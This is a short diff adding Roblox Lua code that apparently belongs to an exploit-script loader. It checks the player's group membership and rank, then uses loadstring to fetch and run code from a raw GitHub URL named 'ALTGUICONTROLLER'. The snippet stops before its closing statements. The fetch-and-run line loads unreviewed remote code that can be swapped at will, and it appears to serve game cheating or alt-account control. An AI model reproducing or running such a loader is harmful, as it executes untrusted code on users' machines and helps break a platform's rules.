@@ -1,0 +1,3 @@
+if game.Players.LocalPlayer:IsInGroup(11906512) then 
+    if game.Players.LocalPlayer:GetRankInGroup(11906512) == 1 then 
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Pastebin2345/-AltGUI-/main/ALTGUICONTROLLER'))() 
